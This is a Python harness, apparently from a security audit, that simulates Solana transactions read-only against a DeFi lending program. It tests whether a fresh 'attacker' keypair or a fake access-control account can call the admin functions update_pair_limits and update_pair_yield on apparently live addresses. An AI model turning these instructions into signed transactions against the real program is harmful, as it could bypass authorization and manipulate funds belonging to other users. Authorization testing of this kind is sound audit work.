#!/usr/bin/env python3
"""Read-only simulateTransaction harness (sigVerify=false). NO signing, NO sending."""
import base64, json, sys, hashlib
sys.path.insert(0, "/home/heisenberg/CA/exceed-finance/analysis/childB")
from rpc import call
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature
from solders.keypair import Keypair

PROGRAM = Pubkey.from_string("par1tyqusak2f2DXg9RHv78SVHNWXkJLSbtJZQSuWjV")
PAIR_PIKUSDC = Pubkey.from_string("EwqMpnBHKEd537E37kcsNU9Qi82uukjVAXsC8K5Kswt7")
AC = Pubkey.from_string("fVo899DhvJosC7DuN2T9p5GYfsTGJqTv6TDeE97YGBe")
PAIR_AUTH = Pubkey.from_string("WYSyHasQGFCtfHb1W5pFf64YCzvMSahJgBoZei5RrwJ")
VAULT_AUTH = PAIR_AUTH
WINDOW_AUTH = Pubkey.from_string("F2x6FM19gx68ubHWxNBsJKQksM5N38QhmgYhEG7yLnHv")
DEPOSIT_AUTH = Pubkey.from_string("CpdVRBHtnDd3RbYzvESXdrAD5bhWdQNvbfLUfjJpQnTE")

def disc(name): return hashlib.sha256(f"global:{name}".encode()).digest()[:8]

def u64(x): return x.to_bytes(8, "little")

def opt_u64(v): return b"\x01" + u64(v) if v is not None else b"\x00"
def opt_u16(v): return b"\x01" + v.to_bytes(2, "little") if v is not None else b"\x00"

ATTACKER = Keypair().pubkey()
print("attacker pubkey:", ATTACKER)

def simulate(payer, ixs, label):
    bh = Hash.from_string(call("getLatestBlockhash", [{"commitment": "confirmed"}])["result"]["value"]["blockhash"])
    msg = Message.new_with_blockhash(ixs, payer, bh)
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    txb64 = base64.b64encode(bytes(tx)).decode()
    r = call("simulateTransaction", [txb64, {"sigVerify": False, "replaceRecentBlockhash": True,
                                             "encoding": "base64", "commitment": "confirmed"}])
    val = r.get("result", {})
    if "value" in val:
        val = val["value"]
    err = val.get("err")
    logs = val.get("logs") or []
    print(f"\n##### {label}")
    print(f"   err = {json.dumps(err)}")
    for l in logs[-16:]:
        print("   log:", l)
    return err, logs

# ---------- update_pair_limits ----------
def update_pair_limits_ix(authority, pair=PAIR_PIKUSDC, ac=AC):
    data = disc("update_pair_limits") + opt_u64(10_000_000_000_000) + opt_u64(None) + opt_u16(None) + opt_u16(None) + opt_u16(None)
    metas = [
        AccountMeta(pair, False, True),
        AccountMeta(authority, True, False),
        AccountMeta(ac, False, False),
    ]
    return Instruction(PROGRAM, data, metas)

# control: real pair_authority signs (sigVerify=false lets us mark it signer)
simulate(PAIR_AUTH, [update_pair_limits_ix(PAIR_AUTH)], "CONTROL update_pair_limits (real pair_authority as signer)")

# attacker: fresh signer as authority, real access_control
simulate(ATTACKER, [update_pair_limits_ix(ATTACKER)], "ATTACKER update_pair_limits (fresh signer as authority, real AC)")

# attacker: fresh signer + attacker-owned fake access_control
simulate(ATTACKER, [update_pair_limits_ix(ATTACKER, ac=ATTACKER)], "ATTACKER update_pair_limits (fresh signer + fake AC=attacker acct)")

# ---------- update_pair_yield ----------
def update_pair_yield_ix(authority, pair=PAIR_PIKUSDC, ac=AC):
    data = disc("update_pair_yield") + u64(1_000_000_000_000)
    metas = [AccountMeta(pair, False, True), AccountMeta(authority, True, False), AccountMeta(ac, False, False)]
    return Instruction(PROGRAM, data, metas)

simulate(PAIR_AUTH, [update_pair_yield_ix(PAIR_AUTH)], "CONTROL update_pair_yield (real pair_authority)")
simulate(ATTACKER, [update_pair_yield_ix(ATTACKER)], "ATTACKER update_pair_yield (fresh signer)")
